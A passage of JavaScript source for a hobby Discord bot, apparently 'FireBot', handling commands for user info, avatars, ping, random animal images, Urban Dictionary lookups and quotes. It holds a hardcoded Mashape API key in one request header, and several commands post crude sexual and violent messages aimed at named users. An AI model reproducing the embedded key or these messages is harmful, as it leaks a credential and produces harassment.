      if (e.message.content ==prefix+"userinfo") {
          e.message.channel.sendMessage("**You can provide a nickname after the command to get info about someone else**\n:bust_in_silhouette: Info About " + e.message.author.nickMention + "\n" +"➣ Username: "+ e.message.author.username + "\n" + "➣ Nickname: " + e.message.author.nickMention + "\n" + "➣ Discriminator: " + e.message.author.discriminator + "\n" + "➣ Registered at (Bot's local timezone applies): " + e.message.author.registeredAt + "\n" + "➣ Avatar URL: " + e.message.author.avatarURL + "\n" + "➣ Bot user: " + e.message.author.bot + "\n➣ ID: " + e.message.author.id);
  }
  
          if (e.message.content =="*id") {
          var idideid = e.message.author.id;
          e.message.channel.sendMessage("", false, {
                title: "‮",
                timestamp: createdat,
                color: 0x00FF00,
                fields: [{
                  name: "The id of "+e.message.author.username+":",
                  value: idideid,
                  inline: true,
              }],
                footer: {
                  text: "ID",
                  icon_url: client.User.avatarURL
                }
              }); 
          }
          if (e.message.content.startsWith(prefix+"id ")) {
            try{
          var ididid = client.Users.find(fn => fn.username == e.message.content.slice(4)).id;
          e.message.channel.sendMessage("", false, {
                title: "‮",
                timestamp: createdat,
                color: 0x00FF00,
                fields: [{
                  name: "The id of "+e.message.content.slice(4)+":",
                  value: ididid,
                  inline: true,
              }],
                footer: {
                  text: "ID",
                  icon_url: client.User.avatarURL
                }
              }); 
                                  }catch(err){
              e.message.channel.sendMessage("No user found. **Use nicknames not mentions like this:**  `*id <Username>`");
            }
          }
          if (e.message.content.startsWith(prefix+"hex")) {
            var randomhexthing = randomHex();
                    e.message.channel.sendMessage("", false, {
                title: omgwt,
                timestamp: createdat,
                color: randomHex(),
                fields: [{
                  name: "Hex:",
                  value: randomhexthing,
                  inline: true,
              }],
                footer: {
                  text: "Random hex generator",
                  icon_url: client.User.avatarURL
                }
              }); 
        }
          if (e.message.content.startsWith(prefix+"userinfo ")) {
            try{
          var usrinfid = client.Users.find(fn => fn.username == e.message.content.slice(10)).id;
          var usrinfnam = client.Users.find(fn => fn.username == e.message.content.slice(10)).username;
          var usrinfava = client.Users.find(fn => fn.username == e.message.content.slice(10)).avatarURL;
          var usrinfdisc = client.Users.find(fn => fn.username == e.message.content.slice(10)).discriminator;
          e.message.channel.sendMessage("", false, {
                title: omgwt,
                timestamp: createdat,
                color: 0x00FF00,
                fields: [{
                  name: "Username:",
                  value: usrinfnam,
                  inline: true,
                },{
                  name: "ID:",
                  value: usrinfid,
                  inline: true,
                },{
                  name: "Discriminator:",
                  value: usrinfdisc,
                  inline: true,
                },{
                  name: "Avatar:",
                  value: "‮",
                  inline: false,
              }],
              image: {
                url: usrinfava,
              },
                footer: {
                  text: "Userinfo",
                  icon_url: client.User.avatarURL
                }
              }); 
                                  }catch(err){
              e.message.channel.sendMessage("No user found. **Use nicknames not mentions like this:**  `*username <Username>`");
            }
          }
          if (e.message.content =="*avatar") {
              var avataravaa = e.message.author.avatarURL;
          e.message.channel.sendMessage("", false, {
                title: "The avatar of "+e.message.author.username+".",
                timestamp: createdat,
                color: 0x00FF00,
              image: {
                url: avataravaa,
              },
                footer: {
                  text: "Avatar",
                  icon_url: client.User.avatarURL
                }
              });
        }
          if (e.message.content.startsWith(prefix+"avatar ")) {
            try{
              var avatarava = client.Users.find(fn => fn.username == e.message.content.slice(8)).avatarURL;
          e.message.channel.sendMessage("", false, {
                title: "The avatar of "+e.message.content.slice(8)+".",
                timestamp: createdat,
                color: 0x00FF00,
              image: {
                url: avatarava,
              },
                footer: {
                  text: "Avatar",
                  icon_url: client.User.avatarURL
                }
              }); 
                    }catch(err){
              e.message.channel.sendMessage("No user found. **Use nicknames not mentions like this:**  `*avatar <Username>`");
            }
        }
      if(e.message.content == prefix + "ping") {
    e.message.channel.sendMessage("ping")
  .then(sentMessage => {
	  sentMessage.edit(`:ping_pong: Pong | ${Date.parse(sentMessage.timestamp) - Date.parse(e.message.timestamp)}ms`);
  });
  }

      if(e.message.content == prefix + "TTtestping") {
    e.message.channel.sendMessage("ping")
  .then(sentMessage => {
    sentMessage.edit("", false, {
                title: "lol",
                timestamp: createdat,
                color: 0x32CD32,
                fields: [{
                  name: "Pong",
                  value: `${Date.parse(sentMessage.timestamp) - Date.parse(e.message.timestamp)}MS | <333`,
                  inline: true,
              }],
                footer: {
                  text: "Ping",
                  icon_url: client.User.avatarURL
                }
                })
  });
  }
      if(e.message.content.startsWith(prefix+"dog")) {
    request("http://random.dog/woof", function (error, response, body) {
      if (!error && response.statusCode == 200) {
        e.message.channel.sendMessage("http://random.dog/" + body + " here you go :heart:");
      }
    });
  }
  //if command equal to cat
      if(e.message.content.startsWith(prefix+"cat")) {
    request("http://random.cat/meow", function (error, response, body) {
      if (!error && response.statusCode == 200) {
        var result = JSON.parse(body);
        var cat = result.file;
        console.log(cat);
        e.message.channel.sendMessage(cat + " MEOW");
      }
    });
  }
        if(e.message.content.startsWith(prefix+"annoy")) {
          var tempthing = e.message.content.slice(7);
          var message = tempthing.replace(" ", "+");
          e.message.channel.sendMessage(message);
    /*request("http://annoy.michaelreeves.us:2888/annoy?message=", function (error, response, body) {
      if (!error && response.statusCode == 200) {
        var result = JSON.parse(body);
        var finalbody = result.file;
        console.log(finalbody);
        e.message.channel.sendMessage(finalbody);
      }
    });*/
  }

      if (e.message.content ==prefix+"urban") {
    e.message.channel.sendMessage("Correct usage `*urban **<search term>**`")
  }
      if(e.message.content.startsWith(prefix+"urban ")) {
    request("http://api.urbandictionary.com/v0/define?term="+e.message.content.substring(7), function(error, response, body) { 
                    //todo: fix async flow
      if (!error && response.statusCode == 200) {
                      var pack = JSON.parse(body);
                      try {
                              e.message.channel.sendMessage('\n *' + e.message.content.substring(7) + '* By ' + pack.list[1].author + '\nDefinition: ```' + pack.list[1].definition + '```\n\nLikes:thumbsup:: ' + pack.list[1].thumbs_up + '\nDislikes:thumbsdown:: ' + pack.list[1].thumbs_down+"");
                            } 
                      catch(no)
                            {
                              e.message.channel.sendMessage("\n :x: "+"That word is not on the the urban dictionary!");
                            } 
                    }
      else if (response.statusCode == 404 || 400){
                      console.log("lol");
                    }
      else console.log(error);
    });
  }
      if(e.message.content.startsWith(prefix+"quote")) 
    request({
      headers: {
        "X-Mashape-Authorization": "2W1js31pYJmshjhSeK7bv8Sb4SIgp1HPxkDjsnxBZqr7ZhGKZ2"
      },
      uri: "https://andruxnet-random-famous-quotes.p.mashape.com/cat=movies",
      method: "POST"
    }, function (err, res, body) {
      if (!err && res.statusCode == 200) {
        const quote = JSON.parse(body);
        e.message.channel.sendMessage("", false, {
                title: "‮ ",
                color: 0x32CD32,
                fields: [{
                  name: "Quote:",
                  value: " \" " + quote.quote + " \" -" + quote.author,
                  inline: true,
              }],
                footer: {
                  text: "Quote",
                  icon_url: client.User.avatarURL
                }
                })
      } else {
        throw "Error.";
      }
    });
  	  if (e.message.content.startsWith(prefix+"unsplash")) {
      var httpsPoster = require("https");
      var options = {
        hostname: "source.unsplash.com",
        port : 443,
        path: "/random",
        method: "GET",
        headers: {

        }
      };
      var req = httpsPoster.get(options, function(res) {
        console.log(JSON.parse(JSON.stringify(res.headers)).location);
        var url = JSON.parse(JSON.stringify(res.headers)).location;
        res.setEncoding("utf8");
        res.on("data", function (body) {
          e.message.channel.sendMessage(url);
        });
      });
      req.on("error", function(e) {
        console.log(e.message);
      });
    }
  //else if (e.message.content.startsWith("*penguin")) {
    ///request("http://penguin.wtf", function (error, response, body) {
      ///if (!error && response.statusCode == 200) {
     //   e.message.channel.sendMessage("here you go :heart:" + body);
	//}})
 
    //var req = httpsPoster.get(options, function(res) {
     // console.log(JSON.parse(JSON.stringify(res.headers)).location);
     /// var url = JSON.parse(JSON.stringify(res.headers)).location;
   /////// ///  res.setEncoding("utf8");
    ///  res.on("data", function (body) {
    ///// ////   e.message.channel.sendMessage(url);

      //////////})
  ////////})
   // req.on("error", function(e) {
    //  console.log(e.message);
    ///})
//}
      if(e.message.content.startsWith("sdfgewsfdghnJ#J(%#J9jrtj9WTJW#$(TJ#(TJ(#WJJW@$(Jwerjw23jW(#$J%(#J%")){
  brokencodelol
}
	  if(e.message.content.startsWith(prefix+"slap")) 
    e.message.channel.sendMessage(e.message.author.nickMention + " Just slaped" + e.message.content.substring(5,2000));
    	  if(e.message.content.startsWith(prefix+"fuck")) {
        e.message.channel.sendMessage("ok");
      }
          	  if(e.message.content.startsWith(prefix+"play")) {
        e.message.channel.sendMessage("**Sorry,** FireBot music is currently not avalible\n**Reason:** Kind of because of lazy devs :P. But the hosting is a problem too :/");
      }
                	  if(e.message.content.startsWith(prefix+"summon")) {
        e.message.channel.sendMessage("**Sorry,** FireBot music is currently not avalible\n**Reason:** Kind of because of lazy devs :P. But the hosting is a problem too :/");
      }
            if (e.message.content.startsWith("*insult")) {
      insultgenerator(function(insult)
{
        e.message.channel.sendMessage(insult+"");
})
      }
      if (e.message.content == prefix+"leet") {
    e.message.channel.sendMessage("Correct usage: `*leet leet haxor`");	
  }
      if(e.message.content.startsWith(prefix+"leet ")) {
    e.message.channel.sendMessage(leet.convert(e.message.content.substring(6)));
  } 
      if(e.message.content.startsWith(prefix+"rape")) {
    e.message.channel.sendMessage(e.message.author.nickMention+" JUST RAPED "+e.message.content.substring(5));
  }
	  if(e.message.content.startsWith(prefix+"stab ")) 
    e.message.channel.sendMessage(e.message.author.nickMention + " Just stabbed" + e.message.content.substring(5,2000));
	  if(e.message.content.startsWith(prefix+"shoot ")) 
    e.message.channel.sendMessage(e.message.author.nickMention + " Just shot " + e.message.content.substring(7,2000));
      if(e.message.content.startsWith(prefix+"succ ")) 
    e.message.channel.sendMessage(e.message.author.nickMention + " Just sucked out " + e.message.content.substring(6,2000) + "");
      if(e.message.content.startsWith(prefix+"hug ")) 
    e.message.channel.sendMessage(e.message.author.nickMention + " Just hugged " + e.message.content.substring(5,2000) + "");
      if(e.message.content.startsWith(prefix+"kiss ")) 
    e.message.channel.sendMessage(e.message.author.nickMention + " Just gave a kiss to " + e.message.content.substring(6,2000) + "");
      if(e.message.content.startsWith(prefix+"cookie ")) 
    e.message.channel.sendMessage(e.message.author.nickMention + " Just gave a cookie to " + e.message.content.substring(7,2000) + " ^.^-:cookie: ");
      if(e.message.content.startsWith(prefix+"candy ")) 
    e.message.channel.sendMessage(e.message.author.nickMention + " Just gave a candy to " + e.message.content.substring(7,2000) + " ^o^-:candy: ");
      if(e.message.content.startsWith(prefix+"spank ")) 
    e.message.channel.sendMessage(e.message.author.nickMention + " Just spanked " + e.message.content.substring(7,2000) + " ");
      if(e.message.content.startsWith(prefix+"nofork ")) 
    e.message.channel.sendMessage(e.message.author.nickMention + " no fork for u " + e.message.content.substring(7,2000) + " xdddddddddddddddddddddddddddddddddddddddddddddddddddddddddd");
      if(e.message.content.startsWith(prefix+"gotfucked ")) 
    e.message.channel.sendMessage(e.message.content.substring(10,32) + " just got fucked by "+ e.message.content.substring(33,2000));
      if(e.message.content.startsWith(prefix+"pet ")) 
    e.message.channel.sendMessage("*"+e.message.author.nickMention + " Pets " + e.message.content.substring(4,2000) + "* ^o^");
      if(e.message.content.startsWith(prefix+"kill ")) 
    e.message.channel.sendMessage(e.message.author.nickMention + " Just bruttaly murdered " + e.message.content.substring(6,2000) + " :knife:");


// plez work
		  if (e.message.content == (prefix+"num")) {
    e.message.channel.sendMessage("Usage: **`*num [Any number from 1 to 9999999999999999999]`**");
		  }	
		  		  if (e.message.content.startsWith("*num ")) {
		  		      var numshit = e.message.content.substring(6);
      e.message.channel.sendMessage(Math.floor(Math.random() * numshit));
		  }	
		  if (e.message.content.startsWith(prefix+"garfield")) {
        var garfieldthing = garfield.random();
        e.message.channel.sendMessage(garfieldthing+"\n:large_blue_diamond: Total comics: **"+garfield.count+"**");
  }
		  if (e.message.content.startsWith(prefix+"8ball ")) {
    var responses = ["It is certain", "Without a doubt", "You may rely on it", "Most likely", "Yes", "Signs point to yes", "Better not tell you now", "Don't count on it", "My reply is no", "My sources say no", "Outlook not so good", "Very doubtful"];
    e.message.channel.sendMessage(":8ball: | "+responses[Math.floor(Math.random() * (responses.length))]);
		  }	  
		  		  if (e.message.content.startsWith(prefix+"rate ")) {
      var responsess = ["1/10", "2/10", "3/10", "4/10", "5/10", "6/10", "7/10", "8/10", "9/10", "10/10", "11/10", "0/10"];
      e.message.channel.sendMessage("I give `"+e.message.content.substring(6)+"` a "+responsess[Math.floor(Math.random() * (responsess.length))]);
				  }
		  		  		  if (e.message.content.startsWith(prefix+"rate-gud")) {
        var responsesss = ["7/10", "8/10", "9/10", "10/10", "11/10"];
        e.message.channel.sendMessage("I give that a "+responsesss[Math.floor(Math.random() * (responsesss.length))]);
				  }
		  		  		  		  if (e.message.content.startsWith(prefix+"worth")) {
          var responsessss = ["1 BitCoin", "alot", "0.1 Doge Coin", "5$", "4$", "3$", "2$", "1$", "1MIL$", "50 REMS", "A sex change", "A pengu", "A fork", "A candy", "-1$", "```9999999999999MIL```"];
								  e.message.channel.sendMessage(e.message.author.nickMention +"`"+e.message.content.substring(7)+"` is worth "+responsessss[Math.floor(Math.random() * (responsessss.length))]);
				  }
    }catch(err){
      e.message.channel.sendMessage(":fire: **Error:** **```js\n"+err+"\n```**");
      console.log("ERROR: "+err);
    }
});
